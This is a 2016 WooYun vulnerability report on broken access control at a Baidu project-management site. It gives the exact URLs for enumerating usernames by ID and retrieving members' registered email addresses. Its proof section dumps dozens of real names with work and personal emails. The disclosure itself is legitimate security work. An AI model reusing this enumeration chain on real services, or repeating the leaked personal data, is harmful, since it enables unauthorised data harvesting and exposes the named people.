{"id": 86970, "wybug_id": "wooyun-2016-0191930", "wybug_title": "百度某分站多处越权进一步获取该站注册用户信息", "wybug_corp": "百度", "wybug_author": "getshell1993", "wybug_date": "2016-04-03 13:00", "wybug_open_date": "2016-05-21 17:30", "wybug_type": "未授权访问/权限绕过", "wybug_level": "高", "wybug_rank_0": "12", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2016-04-03：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2016-04-06：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2016-04-16：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2016-04-26：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2016-05-06：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2016-05-21：\t细节向公众公开  简要描述： 多个越权组合 详细说明：  百度效率云https://xiaolvyun.baidu.com/这系统越权超级多，例如\n\n越权查看他人计划卡片https://xiaolvyun.baidu.com/abc123/icafe//planAndTrack/1122/edit?_=1459597042687 \n\nhttps://xiaolvyun.baidu.com/abc123/icafe//planAndTrack/2155/edit?_=1459597042687\n\nhttps://xiaolvyun.baidu.com/abc123/icafe//planAndTrack/2159/edit?_=1459597042687https://xiaolvyun.baidu.com/abc123/icafe//planAndTrack/1076/edit?_=1459597042687https://xiaolvyun.baidu.com/abc123/icafe//planAndTrack/2157/edit?_=1459597042687…………接着发现有一处可以越权查看用户注册邮箱，前提得知道注册用户名https://xiaolvyun.baidu.com/portal/member/dashboard?enterpriseName=test\t\n\n于是结合一处泄露用户名的越权就可以批量获取整站用户信息了https://xiaolvyun.baidu.com/abc123/icafe/issue/1/showHierarchy?_=1459598259235\n\n遍历这个id即可/issue/*/获取到整站用户名再用用户名获取到他的注册邮箱，以及组内成员邮箱https://xiaolvyun.baidu.com/portal/member/dashboard?enterpriseName=iKafe\n\n   漏洞证明：  挑前五个id用户名证明一下，有些一个用户名组内对应了大量账号。\n{\"status\":\"OK\",\"message\":\"操作成功！\",\"data\":{\"memberCount\":4,\"inviteCount\":0,\"users\":[{\"id\":19,\"name\":\"dongshuwang_baidu.com_ikafe\",\"cnname\":\"董树旺\",\"email\":\"dongshuwang@baidu.com\",\"mobile\":\"\",\"enterpriseId\":2,\"enterpriseName\":\"ikafe\",\"enterpriseCnname\":\"爱咖啡\",\"certificate\":null},{\"id\":23,\"name\":\"wangzhonggang01_baidu.com_ikafe\",\"cnname\":\"超级小鸡哥\",\"email\":\"wangzhonggang01@baidu.com\",\"mobile\":\"\",\"enterpriseId\":2,\"enterpriseName\":\"ikafe\",\"enterpriseCnname\":\"爱咖啡\",\"certificate\":null},{\"id\":24,\"name\":\"songkexin01_baidu.com_ikafe\",\"cnname\":\"宋克汉姆\",\"email\":\"songkexin01@baidu.com\",\"mobile\":\"\",\"enterpriseId\":2,\"enterpriseName\":\"ikafe\",\"enterpriseCnname\":\"爱咖啡\",\"certificate\":null},{\"id\":35,\"name\":\"wangyinan02_baidu.com_ikafe\",\"cnname\":\"王一男\",\"email\":\"wangyinan02@baidu.com\",\"mobile\":\"\",\"enterpriseId\":2,\"enterpriseName\":\"ikafe\",\"enterpriseCnname\":\"爱咖啡\",\"certificate\":null}]}}{\"status\":\"OK\",\"message\":\"操作成功！\",\"data\":{\"memberCount\":24,\"inviteCount\":0,\"users\":[{\"id\":1,\"name\":\"lihui24_baidu.com_baidu\",\"cnname\":\"李辉\",\"email\":\"lihui24@baidu.com\",\"mobile\":\"\",\"enterpriseId\":1,\"enterpriseName\":\"baidu\",\"enterpriseCnname\":\"baidu\",\"certificate\":null},{\"id\":2,\"name\":\"dongshuwang_baidu.com_baidu\",\"cnname\":\"董树旺\",\"email\":\"dongshuwang@baidu.com\",\"mobile\":\"\",\"enterpriseId\":1,\"enterpriseName\":\"baidu\",\"enterpriseCnname\":\"baidu\",\"certificate\":null},{\"id\":3,\"name\":\"xuxiaoqiang_baidu.com_baidu\",\"cnname\":\"Justin\",\"email\":\"xuxiaoqiang@baidu.com\",\"mobile\":\"\",\"enterpriseId\":1,\"enterpriseName\":\"baidu\",\"enterpriseCnname\":\"baidu\",\"certificate\":null},{\"id\":4,\"name\":\"zhangchao19_baidu.com_baidu\",\"cnname\":\"张超\",\"email\":\"zhangchao19@baidu.com\",\"mobile\":\"\",\"enterpriseId\":1,\"enterpriseName\":\"baidu\",\"enterpriseCnname\":\"baidu\",\"certificate\":null},{\"id\":5,\"name\":\"liaochaochao_baidu.com_baidu\",\"cnname\":\"超超\",\"email\":\"liaochaochao@baidu.com\",\"mobile\":\"\",\"enterpriseId\":1,\"enterpriseName\":\"baidu\",\"enterpriseCnname\":\"baidu\",\"certificate\":null},{\"id\":6,\"name\":\"huangdongfa_baidu.com_baidu\",\"cnname\":\"huangdongfa\",\"email\":\"huangdongfa@baidu.com\",\"mobile\":\"\",\"enterpriseId\":1,\"enterpriseName\":\"baidu\",\"enterpriseCnname\":\"baidu\",\"certificate\":null},{\"id\":7,\"name\":\"shiyangyang_baidu.com_baidu\",\"cnname\":\"时扬扬\",\"email\":\"shiyangyang@baidu.com\",\"mobile\":\"\",\"enterpriseId\":1,\"enterpriseName\":\"baidu\",\"enterpriseCnname\":\"baidu\",\"certificate\":null},{\"id\":8,\"name\":\"songkexin01_baidu.com_baidu\",\"cnname\":\"宋克汉姆\",\"email\":\"songkexin01@baidu.com\",\"mobile\":\"\",\"enterpriseId\":1,\"enterpriseName\":\"baidu\",\"enterpriseCnname\":\"baidu\",\"certificate\":null},{\"id\":9,\"name\":\"wangzhonggang01_baidu.com_baidu\",\"cnname\":\"王仲刚\",\"email\":\"wangzhonggang01@baidu.com\",\"mobile\":\"\",\"enterpriseId\":1,\"enterpriseName\":\"baidu\",\"enterpriseCnname\":\"baidu\",\"certificate\":null},{\"id\":10,\"name\":\"xuchen04_baidu.com_baidu\",\"cnname\":\"徐晨\",\"email\":\"xuchen04@baidu.com\",\"mobile\":\"\",\"enterpriseId\":1,\"enterpriseName\":\"baidu\",\"enterpriseCnname\":\"baidu\",\"certificate\":null},{\"id\":11,\"name\":\"yinyan_baidu.com_baidu\",\"cnname\":\"yinyan\",\"email\":\"yinyan@baidu.com\",\"mobile\":\"\",\"enterpriseId\":1,\"enterpriseName\":\"baidu\",\"enterpriseCnname\":\"baidu\",\"certificate\":null},{\"id\":12,\"name\":\"luokai_baidu.com_baidu\",\"cnname\":\"罗凯\",\"email\":\"luokai@baidu.com\",\"mobile\":\"\",\"enterpriseId\":1,\"enterpriseName\":\"baidu\",\"enterpriseCnname\":\"baidu\",\"certificate\":null},{\"id\":13,\"name\":\"xiazhongpu_baidu.com_baidu\",\"cnname\":\"下中铺\",\"email\":\"xiazhongpu@baidu.com\",\"mobile\":\"\",\"enterpriseId\":1,\"enterpriseName\":\"baidu\",\"enterpriseCnname\":\"baidu\",\"certificate\":null},{\"id\":14,\"name\":\"yangyang22_baidu.com_baidu\",\"cnname\":\"杨扬\",\"email\":\"yangyang22@baidu.com\",\"mobile\":\"\",\"enterpriseId\":1,\"enterpriseName\":\"baidu\",\"enterpriseCnname\":\"baidu\",\"certificate\":null},{\"id\":15,\"name\":\"xujinfeng_baidu.com_baidu\",\"cnname\":\"金凤\",\"email\":\"xujinfeng@baidu.com\",\"mobile\":\"\",\"enterpriseId\":1,\"enterpriseName\":\"baidu\",\"enterpriseCnname\":\"baidu\",\"certificate\":null},{\"id\":16,\"name\":\"jianglin04_baidu.com_baidu\",\"cnname\":\"linsama\",\"email\":\"jianglin04@baidu.com\",\"mobile\":\"\",\"enterpriseId\":1,\"enterpriseName\":\"baidu\",\"enterpriseCnname\":\"baidu\",\"certificate\":null},{\"id\":17,\"name\":\"liuqing07_baidu.com_baidu\",\"cnname\":\"庆哥儿\",\"email\":\"liuqing07@baidu.com\",\"mobile\":\"\",\"enterpriseId\":1,\"enterpriseName\":\"baidu\",\"enterpriseCnname\":\"baidu\",\"certificate\":null},{\"id\":18,\"name\":\"dengfeige_baidu.com_baidu\",\"cnname\":\"denger\",\"email\":\"dengfeige@baidu.com\",\"mobile\":\"\",\"enterpriseId\":1,\"enterpriseName\":\"baidu\",\"enterpriseCnname\":\"baidu\",\"certificate\":null},{\"id\":20,\"name\":\"liming16_baidu.com_baidu\",\"cnname\":\"proliming\",\"email\":\"liming16@baidu.com\",\"mobile\":\"\",\"enterpriseId\":1,\"enterpriseName\":\"baidu\",\"enterpriseCnname\":\"baidu\",\"certificate\":null},{\"id\":21,\"name\":\"zhanghuaming_baidu.com_baidu\",\"cnname\":\"zhm\",\"email\":\"zhanghuaming@baidu.com\",\"mobile\":\"\",\"enterpriseId\":1,\"enterpriseName\":\"baidu\",\"enterpriseCnname\":\"baidu\",\"certificate\":null},{\"id\":25,\"name\":\"sunwei18_baidu.com_baidu\",\"cnname\":\"孙伟\",\"email\":\"sunwei18@baidu.com\",\"mobile\":\"\",\"enterpriseId\":1,\"enterpriseName\":\"baidu\",\"enterpriseCnname\":\"baidu\",\"certificate\":null},{\"id\":37,\"name\":\"wangyinan02_baidu.com_baidu\",\"cnname\":\"王一男\",\"email\":\"wangyinan02@baidu.com\",\"mobile\":\"\",\"enterpriseId\":1,\"enterpriseName\":\"baidu\",\"enterpriseCnname\":\"baidu\",\"certificate\":null},{\"id\":319,\"name\":\"xutingting_baidu.com_baidu\",\"cnname\":\"xtt\",\"email\":\"xutingting@baidu.com\",\"mobile\":\"\",\"enterpriseId\":1,\"enterpriseName\":\"baidu\",\"enterpriseCnname\":\"baidu\",\"certificate\":null},{\"id\":488,\"name\":\"wangguan08_baidu.com_baidu\",\"cnname\":\"王冠\",\"email\":\"wangguan08@baidu.com\",\"mobile\":\"\",\"enterpriseId\":1,\"enterpriseName\":\"baidu\",\"enterpriseCnname\":\"baidu\",\"certificate\":null}]}}{\"status\":\"OK\",\"message\":\"操作成功！\",\"data\":{\"memberCount\":4,\"inviteCount\":0,\"users\":[{\"id\":26,\"name\":\"xuxiaoqiang_baidu.com_justin\",\"cnname\":\"Justin\",\"email\":\"xuxiaoqiang@baidu.com\",\"mobile\":\"\",\"enterpriseId\":4,\"enterpriseName\":\"justin\",\"enterpriseCnname\":\"justin\",\"certificate\":null},{\"id\":27,\"name\":\"lihui24_baidu.com_justin\",\"cnname\":\"李辉\",\"email\":\"lihui24@baidu.com\",\"mobile\":\"\",\"enterpriseId\":4,\"enterpriseName\":\"justin\",\"enterpriseCnname\":\"justin\",\"certificate\":null},{\"id\":29,\"name\":\"xujinfeng_baidu.com_justin\",\"cnname\":\"hua\",\"email\":\"xujinfeng@baidu.com\",\"mobile\":\"\",\"enterpriseId\":4,\"enterpriseName\":\"justin\",\"enterpriseCnname\":\"justin\",\"certificate\":null},{\"id\":50,\"name\":\"xiazhongpu_baidu.com_justin\",\"cnname\":\"下中铺\",\"email\":\"xiazhongpu@baidu.com\",\"mobile\":\"\",\"enterpriseId\":4,\"enterpriseName\":\"justin\",\"enterpriseCnname\":\"justin\",\"certificate\":null}]}}{\"status\":\"OK\",\"message\":\"操作成功！\",\"data\":{\"memberCount\":1,\"inviteCount\":0,\"users\":[{\"id\":28,\"name\":\"bestwangguan_hotmail.com_wangguan\",\"cnname\":\"王冠\",\"email\":\"bestwangguan@hotmail.com\",\"mobile\":\"\",\"enterpriseId\":5,\"enterpriseName\":\"wangguan\",\"enterpriseCnname\":\"王冠\",\"certificate\":null}]}}{\"status\":\"OK\",\"message\":\"操作成功！\",\"data\":{\"memberCount\":9,\"inviteCount\":3,\"users\":[{\"id\":30,\"name\":\"shy2850_163.com_javascript\",\"cnname\":\"时扬扬\",\"email\":\"shy2850@163.com\",\"mobile\":\"\",\"enterpriseId\":6,\"enterpriseName\":\"javascript\",\"enterpriseCnname\":\"javascript\",\"certificate\":null},{\"id\":36,\"name\":\"liangzai_cool_yeah.net_javascript\",\"cnname\":\"薛亮\",\"email\":\"liangzai_cool@yeah.net\",\"mobile\":\"\",\"enterpriseId\":6,\"enterpriseName\":\"javascript\",\"enterpriseCnname\":\"javascript\",\"certificate\":null},{\"id\":51,\"name\":\"10030615_qq.com_javascript\",\"cnname\":\"王杰\",\"email\":\"10030615@qq.com\",\"mobile\":\"\",\"enterpriseId\":6,\"enterpriseName\":\"javascript\",\"enterpriseCnname\":\"javascript\",\"certificate\":null},{\"id\":52,\"name\":\"503634165_qq.com_javascript\",\"cnname\":\"严成杰\",\"email\":\"503634165@qq.com\",\"mobile\":\"\",\"enterpriseId\":6,\"enterpriseName\":\"javascript\",\"enterpriseCnname\":\"javascript\",\"certificate\":null},{\"id\":53,\"name\":\"453594574_qq.com_javascript\",\"cnname\":\"李钿\",\"email\":\"453594574@qq.com\",\"mobile\":\"\",\"enterpriseId\":6,\"enterpriseName\":\"javascript\",\"enterpriseCnname\":\"javascript\",\"certificate\":null},{\"id\":54,\"name\":\"363307847_qq.com_javascript\",\"cnname\":\"kenn\",\"email\":\"363307847@qq.com\",\"mobile\":\"\",\"enterpriseId\":6,\"enterpriseName\":\"javascript\",\"enterpriseCnname\":\"javascript\",\"certificate\":null},{\"id\":88,\"name\":\"741102515_qq.com_javascript\",\"cnname\":\"刘骏骋\",\"email\":\"741102515@qq.com\",\"mobile\":\"\",\"enterpriseId\":6,\"enterpriseName\":\"javascript\",\"enterpriseCnname\":\"javascript\",\"certificate\":null},{\"id\":90,\"name\":\"601635472_qq.com_javascript\",\"cnname\":\"阿东\",\"email\":\"601635472@qq.com\",\"mobile\":\"\",\"enterpriseId\":6,\"enterpriseName\":\"javascript\",\"enterpriseCnname\":\"javascript\",\"certificate\":null},{\"id\":91,\"name\":\"itboy2java_163.com_javascript\",\"cnname\":\"changzy\",\"email\":\"itboy2java@163.com\",\"mobile\":\"\",\"enterpriseId\":6,\"enterpriseName\":\"javascript\",\"enterpriseCnname\":\"javascript\",\"certificate\":null}]}}\n   修复方案：  整站做好权限控制   版权声明：转载请注明来源 getshell1993@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：17  确认时间：2016-04-06 17:22 厂商回复： 感谢您关注百度安全! 最新状态： 暂无  ", "replys": "漏洞评价：\n评价\n     2016-04-03 13:24 |    \t\t坏男孩-A_A \t\t\t( 实习白帽子  |\t\t\t        Rank:81 漏洞数:23        | 膜拜学习中)\t\t \n  = =    \n     2016-04-06 09:54 |    \t\tzowie \t\t\t( 实习白帽子  |\t\t\t        Rank:84 漏洞数:16        | Z先生)\t\t \n  前排瓜子饮料 ps:不提BSRC是因为分低吗    \n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 17, "Ranks": null}